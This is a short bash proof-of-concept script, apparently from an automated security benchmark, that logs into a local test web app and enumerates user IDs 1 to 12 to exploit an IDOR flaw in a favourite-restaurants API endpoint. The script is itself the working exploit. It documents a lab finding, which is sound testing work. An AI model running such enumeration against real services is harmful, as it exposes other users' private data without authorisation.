#!/bin/bash
# POC: POC demonstrating IDOR vulnerability in /api/get_favorite_restaurants.php endpoint. Shows how an authenticated attacker can access any user's favorite restaurants by manipulating the userId parameter.
# Target: ./repo
# Created: 2025-11-07T19:30:58.407Z
# Session: benchmark-XBEN-069-24-mhp8x6to

# IDOR Vulnerability POC - Unauthorized Access to User Favorite Restaurants
# This script demonstrates the IDOR vulnerability in /api/get_favorite_restaurants.php
# by authenticating and then accessing other users' data via userId parameter manipulation

TARGET_URL="${1:-http://localhost:8080}"
COOKIE_JAR="/tmp/cookies_idor.txt"

echo "[*] IDOR Vulnerability POC - Favorite Restaurants"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Authenticate as a user
echo "[+] Step 1: Authenticating as user..."
LOGIN_RESPONSE=$(curl -s -c "$COOKIE_JAR" \
  -X POST "$TARGET_URL/login.php" \
  -d "username=alice&password=password123" \
  -H "Content-Type: application/x-www-form-urlencoded")

# Check if login was successful by verifying cookies were set
if [ ! -f "$COOKIE_JAR" ] || [ ! -s "$COOKIE_JAR" ]; then
  echo "[-] Authentication failed - no session established"
  exit 1
fi

echo "[+] Authentication successful - session established"
echo ""

# Step 2: Enumerate all user IDs (1-12) to access their data
echo "[+] Step 2: Enumerating users by accessing their favorite restaurants..."
echo "[+] Exploiting IDOR by varying userId parameter"
echo ""

EXTRACTED_DATA=()

for user_id in {1..12}; do
  RESPONSE=$(curl -s -b "$COOKIE_JAR" \
    "$TARGET_URL/api/get_favorite_restaurants.php?userId=$user_id" \
    -H "Accept: application/json")
  
  # Check if we got a valid response
  if echo "$RESPONSE" | grep -q "username"; then
    EXTRACTED_DATA+=("$RESPONSE")
    echo "[✓] User ID $user_id - Successfully retrieved data:"
    echo "    $RESPONSE"
  else
    echo "[-] User ID $user_id - No data or error"
  fi
done

echo ""
echo "[+] Step 3: Vulnerability Summary"
echo "[*] Total users accessed: ${#EXTRACTED_DATA[@]}"
echo "[*] IDOR exploitation successful - Attacker accessed all user data without authorization"
echo "[*] This demonstrates broken access control (OWASP A01:2021)"
echo ""

# Cleanup
rm -f "$COOKIE_JAR"

exit 0